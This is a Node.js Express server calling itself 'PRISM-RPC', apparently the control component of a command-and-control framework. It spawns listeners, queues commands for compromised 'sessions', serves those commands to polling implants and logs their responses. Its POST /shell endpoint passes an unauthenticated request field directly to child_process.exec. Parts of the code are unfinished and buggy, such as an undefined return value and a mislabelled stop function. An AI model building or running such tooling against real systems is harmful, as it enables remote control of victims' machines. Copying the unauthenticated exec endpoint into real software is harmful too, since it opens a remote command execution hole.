const express = require('express')
const app = express()
const bodyParser = require('body-parser');
const fs = require('fs');
const { exec } = require('child_process');

//require('./settings.js');
function startListener(options) {
    console.log("Starting listener " + options.Name + " on port " + options.Port);
    var lname = "httpHandler";
    var rpcCmd = "node ../packages/listeners/" + lname + ".js";
    var retval = exec(rpcCmd, (err, stdout, stderr) => {
      var retval = "[+] Spawning new listener...";
      console.log("[+] Spawning new listener...");
      if (err) {
        var retval = "[!] An error occured when invoking the listeners";
      }
      return retval;
    });
    return retval;
}

function stopListener(listener) {
    console.log("Starting Listener: 41414141");

}
function shellExec(cmd) {
  exec(cmd, (err, stdout, stderr) => {
    var retval = stdout;
    if (err) {
      // node couldn't execute the command
      var retval = stderr;
    }
    // the *entire* stdout and stderr (buffered)
    console.log(stdout);
    console.log(stderr);
  });

  return retval;
}
function taskSession(sid, command) {
    console.log("Tasking: " + sid);
    var sdata = fs.readFile("./settings.json", 'utf8', function (err,data) {
      if (err) {
        return console.log(err);
      }
      var settings = JSON.parse(data);

    var cmdqueue = settings.dataDir + "log\\session\\" +  sid + "\\commandqueue.json";

    fs.readFile(cmdqueue, 'utf-8', function(err, data) {
      if (err) throw err

      var arrayOfObjects = JSON.parse(data)
      arrayOfObjects.push({
        cid: "2",
        cmd: command
      })

      console.log(arrayOfObjects)

      fs.writeFile(cmdqueue, JSON.stringify(arrayOfObjects), 'utf-8', function(err) {
        if (err) throw err
        console.log('Done!')
      })
    })});
}

//*************
//MAIN FUNCTION
function main() {
  var sdata = fs.readFile("./settings.json", 'utf8', function (err,data) {
    if (err) {
      return console.log(err);
    }
    var settings = JSON.parse(data);
    console.log("Settings:\n " + data);

    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(bodyParser.json());

    app.get('/shell', function (req, res) {
      var sid = "1337";
      //Get CMD to Exec
      var cmdqueue = settings.dataDir + "log\\session\\" +  sid + "\\commandqueue.json";
      fs.readFile(cmdqueue, 'utf8', function (err, data) {
        if (err) {
          return console.log(err);
        }
        console.log(data);
        res.send(data);
      });

    })

    app.post('/sessions',function(req){
      var res = req.body.resp;
      //console.log(req.body);
      console.log("Command Response: " + res);
      //res.end("yes");
    });

    app.post('/invoke/listener', function(req, res) {
      var retval = startListener(req.body);
      res.send(retval);
    });

    app.post('/task', function(req, res) {
      console.log("Got Task");
      var sid = req.body.sid;
      var cmd = req.body.cmd;
      taskSession(sid, cmd);
      res.send("Tasking...");
    });

    app.post('/shell', function(req, res) {
      console.log("[+] Invoking locally");
      //var sid = req.body.sid;
      var cmd = req.body.cmd;
      var retval = shellExec(cmd);
      res.send(retval);
    });

    app.listen(settings.rpcPort, function () {
      console.log('[+] PRISM-RPC listening on port: ' + settings.rpcPort);
    })
  });
}
main();

//var settings = JSON.parse(sdata);
 //= sdata;
//var settings = getSettings();
//console.log("Settings:\n " + settings.lwd);
